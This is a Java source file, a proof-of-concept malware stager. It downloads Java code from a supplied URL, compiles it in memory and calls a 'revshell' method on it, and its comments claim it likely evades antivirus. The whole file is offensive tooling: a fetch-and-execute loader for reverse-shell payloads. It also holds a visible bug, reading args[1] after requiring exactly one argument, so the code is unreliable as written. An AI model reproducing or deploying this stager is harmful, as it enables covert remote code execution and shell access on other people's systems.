
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLConnection;

/*
 * Copyright 2018 cornerpirate.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

/**
 * A proof of concept stager. This downloads a payload from a URL
 * Compiles it in memory and then executes a method in that payload.
 * I was inspired by this talk by James Williams:
 * 
 *   https://www.youtube.com/watch?v=247m2dwLlO4
 * 
 * Who said try it in Java.
 * 
 * This is a modified version of the "InMemoryJavaCompiler" project which is
 * available here:
 * 
 *   https://github.com/trung/InMemoryJavaCompiler
 * 
 * Bypassing AntiVirus is likely but I just wanted to replicate some of the 
 * interesting steps in Java.
 * 
 * @author cornerpirate
 */
public class Stager {

    public static void main(String args[]) {

        // Check how many arguments were passed in
        if (args.length != 1) {
            System.out.println("Proper Usage is: java Stager <url>");
            System.exit(0);
        }
        
        // if we get here then a parameter was provided.
        String u = args[1] ;
        System.out.println("[*] URL provided: " + u);

        try {

            // URL for java code
            URL payloadServer = new URL(u);

            URLConnection yc = payloadServer.openConnection();
            BufferedReader in = new BufferedReader(new InputStreamReader(
                    yc.getInputStream()));

            // Download code into memory
            String inputLine;
            StringBuffer payloadCode = new StringBuffer();
            while ((inputLine = in.readLine()) != null) {
                payloadCode.append(inputLine + "\n");
            }

            System.out.println("[*] Downloaded payload");
            
            // compile it
            System.out.println("[*] Compiling ....");
            Class<?> compiled = org.mdkt.compiler.InMemoryJavaCompiler.newInstance().compile("payload", payloadCode.toString());
            System.out.println("Compiled: " + compiled.getName());

            System.out.println("[*] Executing ....");
            // execute "revshell" method on a new instance of the object
            // change this method name as appropriate for your payload object.
            compiled.getMethod("revshell").invoke(compiled.newInstance());
            System.out.println("[*] Done ....");

            in.close();
        } catch (Exception ex) {
            ex.printStackTrace();
        }



    }

}
